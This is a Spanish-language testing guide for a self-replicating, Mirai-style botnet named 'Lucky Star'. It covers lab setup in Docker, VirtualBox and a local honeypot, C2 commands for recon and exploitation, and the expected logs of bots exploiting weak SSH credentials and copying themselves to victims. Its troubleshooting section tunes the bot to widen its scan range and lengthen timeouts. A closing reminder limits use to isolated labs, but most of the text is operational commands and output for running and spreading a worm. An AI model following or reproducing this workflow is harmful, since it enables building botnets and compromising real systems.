# 🧪 Guía de Pruebas - Lucky Star Botnet

## Opción 1: Docker (Recomendado) 🐳

### Ventajas
- ✅ Rápido y fácil
- ✅ Entorno aislado
- ✅ No necesita VMs

### Setup

1. **Instalar Docker Desktop**
   ```
   https://www.docker.com/products/docker-desktop
   ```

2. **Iniciar contenedores vulnerables**
   ```bash
   docker-compose -f docker-vulnerable-ssh.yml up -d
   ```

3. **Verificar que están corriendo**
   ```bash
   docker ps
   ```

4. **Probar conexión manual**
   ```bash
   ssh admin@localhost -p 2201
   # Password: admin
   ```

### Ejecutar Prueba

```bash
# Terminal 1: C2
python c2_commander.py

# Terminal 2: Bot
# Edita bot_soldier.py primero:
# C2_IP = '127.0.0.1'
python bot_soldier.py

# En C2:
★彡 Comandante> recon 1
★彡 Comandante> list 1
★彡 Comandante> exploit 1 1
```

### Verificar Replicación

```bash
# Ver logs del contenedor víctima
docker logs vulnerable_ssh_1

# Conectarse al contenedor
docker exec -it vulnerable_ssh_1 bash
ps aux | grep python
ls -la /tmp/bot_soldier.py
```

### Limpiar

```bash
docker-compose -f docker-vulnerable-ssh.yml down
```

---

## Opción 2: VirtualBox VMs 🖥️

### Ventajas
- ✅ Más realista
- ✅ Prueba en red completa
- ✅ Varios sistemas operativos

### Setup

**VM1: Kali Linux (Atacante + C2)**
```bash
# En Kali:
ip addr show  # Anotar IP (ej: 192.168.56.10)
cd ~/mirai
python3 c2_commander.py
```

**VM2: Ubuntu (Víctima)**
```bash
# Ejecutar script de configuración:
sudo bash setup_vulnerable_vm.sh

# Anotar IP:
ip addr show | grep "inet "
```

**VM3: Windows/Linux (Bot Inicial)**
```bash
# Editar bot_soldier.py:
C2_IP = '192.168.56.10'  # IP de Kali

# Ejecutar:
python3 bot_soldier.py
```

### Red VirtualBox

Configurar todas las VMs en "Red Interna" o "Red NAT":
```
VM1 (Kali):   192.168.56.10
VM2 (Ubuntu): 192.168.56.20
VM3 (Bot):    192.168.56.30
```

---

## Opción 3: Honeypot Local 🍯

### Ventajas
- ✅ Sin Docker ni VMs
- ✅ Una sola máquina
- ✅ Rápido de configurar

### Setup

1. **Iniciar honeypot SSH falso**
   ```bash
   python create_honeypot.py 2222
   ```

2. **Modificar bot para escanear localhost**
   
   En `bot_soldier.py`:
   ```python
   def scan_network(ip_range_str):
       # ...código existente...
       
       # AGREGAR: Forzar escaneo de localhost
       ports_to_scan = [2222, 22, 80]  # Agregar puerto del honeypot
   ```

3. **Ejecutar sistema**
   ```bash
   # Terminal 1: Honeypot
   python create_honeypot.py 2222
   
   # Terminal 2: C2
   python c2_commander.py
   
   # Terminal 3: Bot
   python bot_soldier.py
   ```

---

## Verificación de Replicación ✅

### 1. En el C2 deberías ver:

```
[+] Nuevo bot conectado: DESKTOP-ABC-192.168.1.100
[*] Informe recibido: 2 hosts encontrados

[+] Nuevo bot conectado: victim-192.168.56.20  ← NUEVA VÍCTIMA
```

### 2. En el Bot inicial:

```
[+] 192.168.56.20:22 - OpenSSH 7.4
[*] Explotando SSH 192.168.56.20:22
[+] Acceso SSH: admin@192.168.56.20
[+] Bot replicado en 192.168.56.20
```

### 3. En la Víctima:

```bash
# Ver proceso del bot
ps aux | grep python
# Deberías ver: python3 /tmp/bot_soldier.py

# Ver archivo
ls -la /tmp/bot_soldier.py

# Ver conexión al C2
netstat -an | grep 8443
```

---

## Troubleshooting 🔧

### Bot no encuentra hosts

```python
# En scan_network(), aumentar timeout:
sock.settimeout(2.0)  # Cambiar de 0.5 a 2.0

# Aumentar rango de IPs:
ip_list = list(ip_range)[:100]  # De 30 a 100
```

### Bot no se conecta al C2

```bash
# Verificar firewall
# Windows:
netsh advfirewall firewall add rule name="Mirai C2" dir=in action=allow protocol=TCP localport=8443

# Linux:
sudo ufw allow 8443
```

### Replicación falla

```python
# Ver errores detallados en exploit_ssh():
except Exception as e:
    print(f"[!] Error detallado: {e}")  # Agregar esta línea
    import traceback
    traceback.print_exc()  # Ver stack trace completo
```

---

## Comandos Útiles 🛠️

### Docker
```bash
# Ver logs en tiempo real
docker logs -f vulnerable_ssh_1

# Conectarse al contenedor
docker exec -it vulnerable_ssh_1 bash

# Reiniciar contenedor
docker restart vulnerable_ssh_1

# Ver IPs de contenedores
docker network inspect mirai_docker-vulnerable-ssh_mirai_net
```

### Verificar conectividad
```bash
# Ping
ping 192.168.56.20

# Probar SSH manual
ssh admin@192.168.56.20

# Escanear puertos
nmap 192.168.56.20 -p 22
```

---

## 🎯 Checklist de Prueba Exitosa

- [ ] C2 inicia sin errores
- [ ] Bot se conecta al C2
- [ ] Bot reporta IP del gateway
- [ ] Bot encuentra hosts con SSH abierto
- [ ] Bot explota credenciales débiles
- [ ] Bot se copia al host víctima
- [ ] Nuevo bot se conecta al C2
- [ ] C2 muestra 2+ bots conectados

---

## ⚠️ Recordatorio

**SOLO usar en:**
- ✅ Docker containers
- ✅ VMs locales
- ✅ Red de laboratorio aislada

**NUNCA en:**
- ❌ Redes de producción
- ❌ Sistemas sin permiso
- ❌ Internet pública
